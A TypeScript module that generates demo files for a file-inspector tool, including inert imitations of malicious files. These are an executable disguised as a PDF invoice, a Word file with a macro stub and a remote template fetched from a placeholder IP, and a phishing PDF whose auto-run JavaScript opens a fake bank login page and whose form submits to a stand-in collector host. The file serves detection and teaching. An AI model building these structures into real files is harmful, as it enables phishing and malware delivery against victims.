// Demo files so visitors can try the inspector without their own suspicious files.
// The dangerous samples are inert: they only contain the markers, no working payload.

import { strToU8, zipSync } from 'fflate';

export interface Sample {
  readonly id: string;
  readonly label: string;
  readonly hint: string;
  load(): Promise<File>;
}

const enc = (s: string) => Uint8Array.from(s, (c) => c.charCodeAt(0) & 0xff);
const file = (parts: BlobPart[], name: string, type: string) => new File(parts, name, { type, lastModified: Date.now() });

async function fetchSample(path: string, name: string): Promise<File> {
  const res = await fetch(`./samples/${path}`);
  if (!res.ok) throw new Error(`Sample ${path} not found`);
  return file([await res.blob()], name, 'image/jpeg');
}

let CRC_TABLE: Uint32Array | null = null;
function crc32(data: Uint8Array): number {
  if (!CRC_TABLE) {
    CRC_TABLE = new Uint32Array(256);
    for (let n = 0; n < 256; n++) {
      let c = n;
      for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
      CRC_TABLE[n] = c >>> 0;
    }
  }
  let c = 0xffffffff;
  for (const b of data) c = CRC_TABLE[(c ^ b) & 0xff]! ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
}

function pngChunk(type: string, data: Uint8Array): Uint8Array {
  const out = new Uint8Array(12 + data.length);
  const dv = new DataView(out.buffer);
  dv.setUint32(0, data.length);
  out.set(enc(type), 4);
  out.set(data, 8);
  dv.setUint32(8 + data.length, crc32(out.subarray(4, 8 + data.length)));
  return out;
}

async function aiPng(): Promise<File> {
  const c = new OffscreenCanvas(640, 400);
  const g = c.getContext('2d')!;
  const sky = g.createLinearGradient(0, 0, 0, 400);
  sky.addColorStop(0, '#1d2b64'); sky.addColorStop(1, '#f8cdda');
  g.fillStyle = sky; g.fillRect(0, 0, 640, 400);
  g.fillStyle = '#ffd36e'; g.beginPath(); g.arc(470, 250, 60, 0, Math.PI * 2); g.fill();
  g.fillStyle = '#0f1630';
  for (let i = 0; i < 12; i++) g.fillRect(i * 55, 300 - (i % 4) * 30, 45, 120 + (i % 4) * 30);
  const png = new Uint8Array(await (await c.convertToBlob({ type: 'image/png' })).arrayBuffer());
  const text = pngChunk('tEXt', enc('parameters\0city skyline at sunset, press photo, 35mm, highly detailed\nSteps: 30, Sampler: DPM++ 2M, CFG scale: 7, Seed: 1234, Model: sdxl_base_1.0'));
  // insert the text chunk right after IHDR (8 byte signature + 25 byte IHDR chunk)
  const out = new Uint8Array(png.length + text.length);
  out.set(png.subarray(0, 33)); out.set(text, 33); out.set(png.subarray(33), 33 + text.length);
  return file([out], 'breaking-news-skyline.png', 'image/png');
}

export const SAMPLES: Sample[] = [
  { id: 'photo', label: 'Edited camera photo', hint: 'Canon photo, edited in Lightroom years later', load: () => fetchSample('IMG_0003.jpg', 'beach-2011.jpg') },
  { id: 'c2pa-ok', label: 'Signed image (C2PA)', hint: 'Valid content credentials from a test signer', load: () => fetchSample('C.jpg', 'signed-image.jpg') },
  { id: 'c2pa-bad', label: 'Tampered signed image', hint: 'Pixels changed after signing', load: () => fetchSample('C-tampered.jpg', 'signed-image-edited.jpg') },
  { id: 'ai', label: 'AI-generated PNG', hint: 'Stable Diffusion prompt stored in the file', load: aiPng },
  {
    id: 'exe', label: 'Fake invoice', hint: 'Program disguised as a PDF',
    load: async () => {
      const b = new Uint8Array(2048);
      b.set([0x4d, 0x5a, 0x90, 0x00]);
      b.set(enc('This program cannot be run in DOS mode. (inert demo sample)'), 78);
      return file([b], 'Rechnung_2026-0412.pdf', 'application/pdf');
    },
  },
  {
    id: 'docm', label: 'Job application with macros', hint: 'Word file with macros and a remote template',
    load: async () => {
      const zip = zipSync({
        '[Content_Types].xml': strToU8('<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>'),
        'word/document.xml': strToU8('<?xml version="1.0"?><w:document xmlns:w="w"><w:body><w:p><w:r><w:t>Bewerbung</w:t></w:r></w:p></w:body></w:document>'),
        'word/_rels/settings.xml.rels': strToU8('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://198.51.100.23/templates/cv.dotm" TargetMode="External"/></Relationships>'),
        'word/vbaProject.bin': new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]),
      });
      return file([zip], 'Bewerbung_Lebenslauf.docx', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document');
    },
  },
  {
    id: 'pdf', label: 'Phishing PDF', hint: 'Auto-running JavaScript and a password form',
    load: async () => file([enc([
      '%PDF-1.7',
      '1 0 obj << /Type /Catalog /OpenAction 2 0 R /AcroForm 4 0 R >> endobj',
      '2 0 obj << /S /JavaScript /JS (app.launchURL("https://login.example-bank.test/verify")) >> endobj',
      '3 0 obj << /Type /Annot /A << /S /URI /URI (https://login.example-bank.test/verify) >> >> endobj',
      '4 0 obj << /Fields [] /SubmitForm (https://collector.example.test) >> endobj',
      '5 0 obj << /Producer (iLovePDF) /CreationDate (D:20260110090000+01\'00\') >> endobj',
      '%%EOF',
    ].join('\n'))], 'Kontosperrung_Information.pdf', 'application/pdf'),
  },
];
